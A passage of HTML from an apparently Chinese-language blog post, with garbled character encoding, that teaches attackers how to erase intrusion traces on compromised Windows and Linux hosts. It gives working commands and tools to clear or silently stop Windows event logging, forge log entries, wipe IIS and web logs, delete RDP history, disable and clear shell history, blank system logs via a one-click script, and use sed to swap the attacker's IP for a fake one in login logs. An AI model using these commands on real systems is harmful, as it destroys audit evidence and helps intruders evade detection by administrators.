title="ï¼ˆ2ï¼‰powershellä¸€é”®æ¸…é™¤Windowsäº‹ä»¶æ—¥å¿—"></a><strong>ï¼ˆ2ï¼‰powershellä¸€é”®æ¸…é™¤Windowsäº‹ä»¶æ—¥å¿—</strong></h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PowerShell <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span></span><br><span class="line">æˆ–</span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-ListLog</span> Application,Setup,Security <span class="literal">-Force</span> | % &#123;Wevtutil.exe cl <span class="variable">$_</span>.Logname&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110613512-722438660.png" alt="img"></p><h4 id="â­ï¼ˆ3ï¼‰åˆ©ç”¨è„šæœ¬åœæ­¢æ—¥å¿—çš„è®°å½•"><a href="#â­ï¼ˆ3ï¼‰åˆ©ç”¨è„šæœ¬åœæ­¢æ—¥å¿—çš„è®°å½•" class="headerlink" title="â­ï¼ˆ3ï¼‰åˆ©ç”¨è„šæœ¬åœæ­¢æ—¥å¿—çš„è®°å½•"></a>â­<strong>ï¼ˆ3ï¼‰åˆ©ç”¨è„šæœ¬åœæ­¢æ—¥å¿—çš„è®°å½•</strong></h4><p>é€šè¿‡è¯¥è„šæœ¬éå†äº‹ä»¶æ—¥å¿—æœåŠ¡è¿›ç¨‹ï¼ˆä¸“ç”¨svchost.exeï¼‰çš„çº¿ç¨‹å †æ ˆï¼Œå¹¶æ ‡è¯†äº‹ä»¶æ—¥å¿—çº¿ç¨‹ä»¥æ€æ­»äº‹ä»¶æ—¥å¿—æœåŠ¡çº¿ç¨‹ã€‚</p><p>è¯¥è„šæœ¬æ²¡æœ‰æ€æ­»è¿›ç¨‹ï¼Œè€Œæ˜¯æ€æ­»äº†çº¿ç¨‹ã€‚å› æ­¤ï¼Œè™½ç„¶äº‹ä»¶æ—¥å¿—æœåŠ¡ä¼¼ä¹åœ¨ç³»ç»Ÿä¸­è¿è¡Œï¼ˆå› ä¸ºæ²¡æœ‰ç»ˆæ­¢è¿›ç¨‹ï¼‰ï¼Œä½†å®ƒå®é™…ä¸Šå¹¶æ²¡æœ‰è¿è¡Œï¼ˆå› ä¸ºç»ˆæ­¢äº†çº¿ç¨‹ï¼‰å¹¶ä¸”ç³»ç»Ÿä¸æ”¶é›†æ—¥å¿—ã€‚</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/hlldz/Phant0m">hlldz&#x2F;Phant0m: Windows Event Log Killer (github.com)</a></p><p>ä½¿ç”¨ï¼š<br><img src="/../images/1964477-20211217110647934-387654697.png" alt="img"></p><p>æ‰§è¡Œphant0mä¹‹åï¼Œå°è¯•è¿œç¨‹ç™»å½•è¯¥æœåŠ¡å™¨ï¼Œå¹¶ä¸ä¼šè®°å½•æ—¥å¿—<br><img src="/../images/1964477-20211217110702635-406062829.png" alt="img"></p><h4 id="â­ï¼ˆ4ï¼‰Windowså•æ¡æ—¥å¿—æ¸…é™¤"><a href="#â­ï¼ˆ4ï¼‰Windowså•æ¡æ—¥å¿—æ¸…é™¤" class="headerlink" title="â­ï¼ˆ4ï¼‰Windowså•æ¡æ—¥å¿—æ¸…é™¤"></a>â­<strong>ï¼ˆ4ï¼‰Windowså•æ¡æ—¥å¿—æ¸…é™¤</strong></h4><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/QAX-A-Team/EventCleaner">QAX-A-Team&#x2F;EventCleaner: A tool mainly to erase specified records from Windows event logs, with additional functionalities. (github.com)</a></p><p>è¯¥å·¥å…·ä¸»è¦ç”¨äºä»Windowsäº‹ä»¶æ—¥å¿—ä¸­åˆ é™¤æŒ‡å®šçš„è®°å½•ã€‚åŒæ—¶ä¹Ÿå¯ä»¥æš‚åœæ—¥å¿—çº¿ç¨‹,åœæ­¢æ—¥å¿—è®°å½•ã€‚</p><p>ä½¿ç”¨æ­¥éª¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1ã€EventCleaner closehandle   <span class="comment">#è§£é™¤ security.evtxçš„æ–‡ä»¶å å‘</span></span><br><span class="line">2ã€EventCleaner 100           <span class="comment">#åˆ é™¤ event record id ä¸º 100 çš„æ—¥å¿—</span></span><br><span class="line">3ã€EventCleaner <span class="built_in">suspend</span>       <span class="comment">#æš‚åœæ—¥å¿—çº¿ç¨‹,åœæ­¢æ—¥å¿—è®°å½•</span></span><br><span class="line">4ã€<span class="keyword">do</span> anything without worrying about logs</span><br><span class="line">5ã€EventCleaner normal        <span class="comment">#æ¢å¤æ—¥å¿—çº¿ç¨‹</span></span><br><span class="line">6ã€delete EventCleaner        </span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110742380-709580735.png" alt="img"><br><img src="/../images/1964477-20211217110753850-106850006.png" alt="img"></p><h4 id="ï¼ˆ5ï¼‰Windowsæ—¥å¿—ä¼ªé€ "><a href="#ï¼ˆ5ï¼‰Windowsæ—¥å¿—ä¼ªé€ " class="headerlink" title="ï¼ˆ5ï¼‰Windowsæ—¥å¿—ä¼ªé€ "></a><strong>ï¼ˆ5ï¼‰Windowsæ—¥å¿—ä¼ªé€ </strong></h4><p>ä½¿ç”¨eventcreateè¿™ä¸ªå‘½ä»¤è¡Œå·¥å…·æ¥ä¼ªé€ æ—¥å¿—æˆ–è€…ä½¿ç”¨è‡ªå®šä¹‰çš„å¤§é‡åƒåœ¾ä¿¡æ¯è¦†ç›–ç°æœ‰æ—¥å¿—ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d <span class="string">&quot;this is a test&quot;</span> -<span class="built_in">id</span> 500</span><br></pre></td></tr></table></figure><h3 id="IISæ—¥å¿—"><a href="#IISæ—¥å¿—" class="headerlink" title="IISæ—¥å¿—"></a><strong>IISæ—¥å¿—</strong></h3><p>IISé»˜è®¤æ—¥å¿—è·¯å¾„ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</span></span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110825916-1141769327.png" alt="img"></p><p>æ¸…é™¤WWWæ—¥å¿—ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">åœæ­¢æœåŠ¡ï¼š<span class="built_in">net</span> stop w3svc</span><br><span class="line">åˆ é™¤æ—¥å¿—ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼š<span class="built_in">del</span> *.*</span><br><span class="line">å¯ç”¨æœåŠ¡ï¼š<span class="built_in">net</span> <span class="built_in">start</span> w3svc</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨Windowsè‡ªå¸¦å‘½ä»¤è¿›è¡Œå®‰å…¨æ“¦é™¤"><a href="#åˆ©ç”¨Windowsè‡ªå¸¦å‘½ä»¤è¿›è¡Œå®‰å…¨æ“¦é™¤" class="headerlink" title="åˆ©ç”¨Windowsè‡ªå¸¦å‘½ä»¤è¿›è¡Œå®‰å…¨æ“¦é™¤"></a><strong>åˆ©ç”¨Windowsè‡ªå¸¦å‘½ä»¤è¿›è¡Œå®‰å…¨æ“¦é™¤</strong></h3><h4 id="ï¼ˆ1ï¼‰Shift-Deleteå¿«æ·é”®æ°¸ä¹…åˆ é™¤"><a href="#ï¼ˆ1ï¼‰Shift-Deleteå¿«æ·é”®æ°¸ä¹…åˆ é™¤" class="headerlink" title="ï¼ˆ1ï¼‰Shift+Deleteå¿«æ·é”®æ°¸ä¹…åˆ é™¤"></a>ï¼ˆ1ï¼‰Shift+Deleteå¿«æ·é”®æ°¸ä¹…åˆ é™¤</h4><p>ç›´æ¥åˆ é™¤æ–‡ä»¶ï¼Œè¿˜æ˜¯èƒ½åœ¨å›æ”¶ç«™æ‰¾åˆ°çš„ï¼Œä½¿ç”¨Shift+Deleteå¿«æ·é”®å¯ä»¥ç›´æ¥æ°¸ä¹…åˆ é™¤äº†ã€‚</p><p>å¯ä»¥ç”¨æ•°æ®æ¢å¤è½¯ä»¶ï¼Œåˆ é™¤çš„æ–‡ä»¶å°½å¿«æ¢å¤ï¼Œå¦åˆ™æ–°çš„æ–‡ä»¶å­˜å…¥è¦†ç›–äº†åŸæ¥çš„æ–‡ä»¶ç—•è¿¹å°±å¾ˆéš¾æ¢å¤äº†ã€‚</p><h4 id="ï¼ˆ2ï¼‰Cipher-å‘½ä»¤å¤šæ¬¡è¦†å†™"><a href="#ï¼ˆ2ï¼‰Cipher-å‘½ä»¤å¤šæ¬¡è¦†å†™" class="headerlink" title="ï¼ˆ2ï¼‰Cipher å‘½ä»¤å¤šæ¬¡è¦†å†™"></a>ï¼ˆ2ï¼‰Cipher å‘½ä»¤å¤šæ¬¡è¦†å†™</h4><p>åœ¨åˆ é™¤æ–‡ä»¶åï¼Œå¯ä»¥åˆ©ç”¨Cipher å‘½ä»¤é€šè¿‡ &#x2F;W å‚æ•°å¯åå¤å†™å…¥å…¶ä»–æ•°æ®è¦†ç›–å·²åˆ é™¤æ–‡ä»¶çš„ç¡¬ç›˜ç©ºé—´ï¼Œå½»åº•åˆ é™¤æ•°æ®é˜²æ­¢è¢«æ¢å¤ã€‚</p><p>æ¯”å¦‚ï¼Œåˆ é™¤<code>D:\tools</code>ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè¿™æ¡å‘½ä»¤ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cipher /w:D:\tools</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€æ¥ï¼ŒD ç›˜ä¸Šæœªä½¿ç”¨ç©ºé—´å°±ä¼šè¢«è¦†ç›–ä¸‰æ¬¡ï¼šä¸€æ¬¡ 0x00ã€ä¸€æ¬¡ 0xFFï¼Œä¸€æ¬¡éšæœºæ•°ï¼Œæ‰€æœ‰è¢«åˆ é™¤çš„æ–‡ä»¶å°±éƒ½ä¸å¯èƒ½è¢«æ¢å¤äº†ã€‚</p><h4 id="ï¼ˆ3ï¼‰Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–"><a href="#ï¼ˆ3ï¼‰Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–" class="headerlink" title="ï¼ˆ3ï¼‰Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–"></a>ï¼ˆ3ï¼‰Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–</h4><p>Format å‘½ä»¤åŠ ä¸Š &#x2F;P å‚æ•°åï¼Œå°±ä¼šæŠŠæ¯ä¸ªæ‰‡åŒºå…ˆæ¸…é›¶ï¼Œå†ç”¨éšæœºæ•°è¦†ç›–ã€‚è€Œä¸”å¯ä»¥è¦†ç›–å¤šæ¬¡ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">format</span> <span class="selector-tag">D</span>: /<span class="selector-tag">P</span>:<span class="number">8</span></span><br></pre></td></tr></table></figure><p>è¿™æ¡å‘½ä»¤è¡¨ç¤ºæŠŠ D ç›˜ç”¨éšæœºæ•°è¦†ç›– 8 æ¬¡ã€‚</p><h3 id="æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•"><a href="#æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•" class="headerlink" title="æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•"></a>æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•</h3><p>å½“é€šè¿‡æœ¬æœºè¿œç¨‹è¿æ¥å…¶ä»–å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨åï¼Œä¼šåœ¨æœ¬æœºå­˜ç•™è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•ã€‚ä»£ç ä¿å­˜ä¸ºclear.batæ–‡ä»¶ï¼ŒåŒå‡»è¿è¡Œå³å¯è‡ªåŠ¨åŒ–æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">reg delete <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot;</span> /va /f</span><br><span class="line">reg delete <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span></span><br><span class="line"><span class="built_in">cd</span> %userprofile%\documents\</span><br><span class="line">attrib Default.rdp -s -h</span><br><span class="line">del Default.rdp</span><br></pre></td></tr></table></figure><h3 id="Metasploit-ç—•è¿¹æ¸…é™¤"><a href="#Metasploit-ç—•è¿¹æ¸…é™¤" class="headerlink" title="Metasploit ç—•è¿¹æ¸…é™¤"></a><strong>Metasploit ç—•è¿¹æ¸…é™¤</strong></h3><p>ï¼ˆ1ï¼‰æŸ¥çœ‹äº‹ä»¶æ—¥å¿—</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run event_manager  -i   </span><br><span class="line">[*] Retriving Event Log Configuration</span><br><span class="line">Event Logs on System</span><br><span class="line">====================</span><br><span class="line"> Name                    Retention  Maximum Size  Records</span><br><span class="line"> ----                    ---------  ------------  -------</span><br><span class="line"> Application             Disabled   20971520K     2149</span><br><span class="line"> HardwareEvents          Disabled   20971520K     0</span><br><span class="line"> Internet Explorer       Disabled   K             0</span><br><span class="line"> Key Management Service  Disabled   20971520K     0</span><br><span class="line"> Security                Disabled   20971520K     1726</span><br><span class="line"> System                  Disabled   20971520K     3555</span><br><span class="line"> Windows PowerShell      Disabled   15728640K     138</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ¸…é™¤äº‹ä»¶æ—¥å¿—ï¼ˆåŒ…æ‹¬å…­ç§æ—¥å¿—ç±»å‹ï¼‰</p><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">meterpreter <span class="operator">&gt;</span> run event_manager  <span class="operator">-</span><span class="built_in">c</span></span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å¦å¤–ï¼Œä¹Ÿå¯ä»¥è¾“å…¥clearvå‘½ä»¤æ¸…é™¤ç›®æ ‡ç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ï¼ˆä»…åŒ…å«ä¸‰ç§æ—¥å¿—ç±»å‹ï¼‰</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line"><span class="selector-attr">[*]</span> Wiping <span class="number">4</span> records <span class="selector-tag">from</span> Application...</span><br><span class="line"><span class="selector-attr">[*]</span> Wiping <span class="number">8</span> records <span class="selector-tag">from</span> System...</span><br><span class="line"><span class="selector-attr">[*]</span> Wiping <span class="number">7</span> records <span class="selector-tag">from</span> Security...</span><br></pre></td></tr></table></figure><h3 id="æ¸…é™¤recent"><a href="#æ¸…é™¤recent" class="headerlink" title="æ¸…é™¤recent"></a><strong>æ¸…é™¤recent</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">åœ¨æ–‡ä»¶èµ„æºç®¡ç†å™¨ä¸­ç‚¹å‡»â€œæŸ¥çœ‹â€-&gt;â€œé€‰é¡¹â€-&gt;åœ¨å¸¸è§„-&gt;éšç§ä¸­ç‚¹å‡»â€æ¸…é™¤â€æŒ‰é’®</span><br><span class="line">æˆ–ç›´æ¥æ‰“å¼€C:\Users\Administrator\Recentå¹¶åˆ é™¤æ‰€æœ‰å†…å®¹</span><br><span class="line">æˆ–åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥del /f /s /q â€œ%userprofile%\Recent*.*</span><br></pre></td></tr></table></figure><h2 id="Linuxå…¥ä¾µç—•è¿¹æ¸…ç†"><a href="#Linuxå…¥ä¾µç—•è¿¹æ¸…ç†" class="headerlink" title="Linuxå…¥ä¾µç—•è¿¹æ¸…ç†"></a>Linuxå…¥ä¾µç—•è¿¹æ¸…ç†</h2><p>ï¼ˆ <strong>#ç®¡ç†å‘˜ $æ™®é€šç”¨æˆ· &#x2F; è¡¨ç¤º æ ¹ç›®å½• ~è¡¨ç¤ºå½“å‰ç”¨æˆ·å®¶ç›®å½•</strong>ï¼‰</p><h3 id="æ¸…é™¤historyå†å²å‘½ä»¤è®°å½•"><a href="#æ¸…é™¤historyå†å²å‘½ä»¤è®°å½•" class="headerlink" title="æ¸…é™¤historyå†å²å‘½ä»¤è®°å½•"></a><strong>æ¸…é™¤historyå†å²å‘½ä»¤è®°å½•</strong></h3><p>æŸ¥çœ‹å†å²æ“ä½œå‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></figure><p>historyæ˜¾ç¤º<strong>å†…å­˜å’Œ~&#x2F;.bash_historyä¸­çš„æ‰€æœ‰å†…å®¹</strong>ï¼›<br>å†…å­˜ä¸­çš„å†…å®¹å¹¶æ²¡æœ‰ç«‹åˆ»å†™å…¥~&#x2F;.bash_historyï¼Œåªæœ‰å½“å½“å‰shellå…³é—­æ—¶æ‰ä¼šå°†å†…å­˜å†…å®¹å†™å…¥shell</p><p>ï¼ˆ1ï¼‰ç¼–è¾‘historyè®°å½•æ–‡ä»¶ï¼Œåˆ é™¤éƒ¨åˆ†ä¸æƒ³è¢«ä¿å­˜çš„å†å²å‘½ä»¤ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_history</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ¸…é™¤å½“å‰ç”¨æˆ·çš„historyå‘½ä»¤è®°å½•â­</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> -c  <span class="comment"># åˆ é™¤å†…å­˜ä¸­çš„æ‰€æœ‰å‘½ä»¤å†å²</span></span><br><span class="line"><span class="built_in">history</span> -r  <span class="comment"># åˆ é™¤å½“å‰ä¼šè¯å†å²è®°å½•</span></span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰åˆ©ç”¨vimç‰¹æ€§åˆ é™¤å†å²å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ä½¿ç”¨vimæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶vi test.txt<span class="comment"># è®¾ç½®vimä¸è®°å½•å‘½ä»¤ï¼ŒVimä¼šå°†å‘½ä»¤å†å²è®°å½•ï¼Œä¿å­˜åœ¨viminfoæ–‡ä»¶ä¸­ã€‚:set history=0# ç”¨vimçš„åˆ†å±åŠŸèƒ½æ‰“å¼€å‘½ä»¤è®°å½•æ–‡ä»¶.bash_historyï¼Œç¼–è¾‘æ–‡ä»¶åˆ é™¤å†å²æ“ä½œå‘½ä»¤ï¼švsp ~/.bash_history# æ¸…æ¥šä¿å­˜.bash_historyæ–‡ä»¶å³å¯ã€‚</span></span></span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110939435-1877634885.png" alt="img"></p><p>ï¼ˆ4ï¼‰åœ¨vimä¸­æ‰§è¡Œè‡ªå·±ä¸æƒ³è®©åˆ«äººçœ‹åˆ°çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="built_in">history</span>=0</span><br><span class="line">:!<span class="built_in">command</span></span><br></pre></td></tr></table></figure><h3 id="â­ä¸è®°å½•historyå†å²å‘½ä»¤"><a href="#â­ä¸è®°å½•historyå†å²å‘½ä»¤" class="headerlink" title="â­ä¸è®°å½•historyå†å²å‘½ä»¤"></a>â­ä¸è®°å½•historyå†å²å‘½ä»¤</h3><p>ï¼ˆ1ï¼‰é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;profileï¼Œä½¿ç³»ç»Ÿä¸å†ä¿å­˜å‘½ä»¤è®°å½•ã€‚</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">HISTSIZE</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110951891-267612086.png" alt="img"></p><p>ï¼ˆ2ï¼‰ç™»å½•åæ‰§è¡Œä¸‹é¢å‘½ä»¤,ä¸è®°å½•å†å²å‘½ä»¤(.bash_history)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">unset <span class="variable constant_">HISTORY</span> <span class="variable constant_">HISTFILE</span> <span class="variable constant_">HISTSAVE</span> <span class="variable constant_">HISTZONE</span> <span class="variable constant_">HISTORY</span> <span class="variable constant_">HISTLOG</span>; <span class="keyword">export</span> <span class="variable constant_">HISTFILE</span>=<span class="regexp">/dev/</span><span class="literal">null</span>; <span class="keyword">export</span> <span class="variable constant_">HISTSIZE</span>=<span class="number">0</span>; <span class="keyword">export</span> <span class="variable constant_">HISTFILESIZE</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="æ¸…é™¤ç³»ç»Ÿæ—¥å¿—ç—•è¿¹"><a href="#æ¸…é™¤ç³»ç»Ÿæ—¥å¿—ç—•è¿¹" class="headerlink" title="æ¸…é™¤ç³»ç»Ÿæ—¥å¿—ç—•è¿¹"></a><strong>æ¸…é™¤ç³»ç»Ÿæ—¥å¿—ç—•è¿¹</strong></h3><p>Linux ç³»ç»Ÿå­˜åœ¨å¤šç§æ—¥å¿—æ–‡ä»¶ï¼Œæ¥è®°å½•ç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ—¥å¿—ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/run/utmp è®°å½•ç°åœ¨ç™»å…¥çš„ç”¨æˆ·ï¼Œä½¿ç”¨w,<span class="built_in">who</span>,<span class="built_in">users</span>ç­‰å‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/var/log/wtmp è®°å½•ç”¨æˆ·æ‰€æœ‰çš„ç™»å…¥å’Œç™»å‡ºï¼Œä½¿ç”¨lastå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/var/log/lastlog è®°å½•æ¯ä¸€ä¸ªç”¨æˆ·æœ€åç™»å…¥æ—¶é—´ï¼Œä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/var/log/btmp è®°å½•æ‰€æœ‰ç™»å½•å¤±è´¥ä¿¡æ¯ï¼Œä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/var/log/auth.log éœ€è¦èº«ä»½ç¡®è®¤çš„æ“ä½œ</span><br><span class="line">/var/log/secure è®°å½•å®‰å…¨ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/var/log/maillog è®°å½•é‚®ä»¶ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/var/log/message è®°å½•ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—</span><br><span class="line">/var/log/cron è®°å½•å®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/var/log/spooler è®°å½•UUCPå’Œnewsè®¾å¤‡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/var/log/boot.log è®°å½•å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨å’Œåœæ­¢ç›¸å…³çš„æ—¥å¿—æ¶ˆæ¯</span><br></pre></td></tr></table></figure><h4 id="ï¼ˆ1ï¼‰æ¸…ç©ºæ—¥å¿—æ–‡ä»¶"><a href="#ï¼ˆ1ï¼‰æ¸…ç©ºæ—¥å¿—æ–‡ä»¶" class="headerlink" title="ï¼ˆ1ï¼‰æ¸…ç©ºæ—¥å¿—æ–‡ä»¶"></a>ï¼ˆ1ï¼‰æ¸…ç©ºæ—¥å¿—æ–‡ä»¶</h4><p>ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; filename</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; filename</span><br><span class="line"><span class="built_in">echo</span> &gt; filename</span><br><span class="line">: &gt; filename</span><br><span class="line">&gt; filename</span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217111008639-1871743190.png" alt="img"></p><h4 id="â­ï¼ˆ2ï¼‰æ›¿æ¢-x2F-åˆ é™¤éƒ¨åˆ†æ—¥å¿—"><a href="#â­ï¼ˆ2ï¼‰æ›¿æ¢-x2F-åˆ é™¤éƒ¨åˆ†æ—¥å¿—" class="headerlink" title="â­ï¼ˆ2ï¼‰æ›¿æ¢&#x2F;åˆ é™¤éƒ¨åˆ†æ—¥å¿—"></a>â­ï¼ˆ2ï¼‰æ›¿æ¢&#x2F;åˆ é™¤éƒ¨åˆ†æ—¥å¿—</h4><p>æ—¥å¿—æ–‡ä»¶å…¨éƒ¨è¢«æ¸…ç©ºï¼Œå¤ªå®¹æ˜“è¢«ç®¡ç†å‘˜å¯Ÿè§‰äº†ï¼Œå¦‚æœåªæ˜¯åˆ é™¤æˆ–æ›¿æ¢éƒ¨åˆ†å…³é”®æ—¥å¿—ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®Œç¾éšè—æ”»å‡»ç—•è¿¹ã€‚</p><p>æ›¿æ¢ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 192.168.100.101ä¸ºæ”»å‡»è€…IPï¼Œ10.0.0.55ä¸ºä¼ªé€ IPï¼Œ-iç¼–è¾‘æ–‡ä»¶</span></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i /var/log/btmp*</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i /var/log/lastlog</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i /var/log/wtmp</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i secure</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i /var/log/utmp</span><br></pre></td></tr></table></figure><p>åˆ é™¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip</span></span><br><span class="line">sed  -i <span class="string">&#x27;/è‡ªå·±çš„ip/&#x27;</span>d  /var/log/messages</span><br><span class="line">sed  -i <span class="string">&#x27;/å½“å¤©æ—¥æœŸ/&#x27;</span>d  filename</span><br></pre></td></tr></table></figure><h3 id="ä¸€é”®æ¸…é™¤historyå’Œç³»ç»Ÿæ—¥å¿—è„šæœ¬"><a href="#ä¸€é”®æ¸…é™¤historyå’Œç³»ç»Ÿæ—¥å¿—è„šæœ¬" class="headerlink" title="ä¸€é”®æ¸…é™¤historyå’Œç³»ç»Ÿæ—¥å¿—è„šæœ¬"></a>ä¸€é”®æ¸…é™¤historyå’Œç³»ç»Ÿæ—¥å¿—è„šæœ¬</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/./bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure><h3 id="æ¸…é™¤webæ—¥å¿—ç—•è¿¹"><a href="#æ¸…é™¤webæ—¥å¿—ç—•è¿¹" class="headerlink" title="æ¸…é™¤webæ—¥å¿—ç—•è¿¹"></a>æ¸…é™¤webæ—¥å¿—ç—•è¿¹</h3><p>webæ—¥å¿—åŒæ ·å¯ä»¥ä½¿ç”¨sedè¿›è¡Œä¼ªé€ ï¼Œä¾‹å¦‚apacheæ—¥å¿—ã€MySQLæ—¥å¿—ã€phpæ—¥å¿—</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> â€“i /var/<span class="built_in">log</span>/apache/access.<span class="built_in">log</span></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> â€“i /var/<span class="built_in">log</span>/apache/error_log</span><br><span class="line"></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> â€“i /var/<span 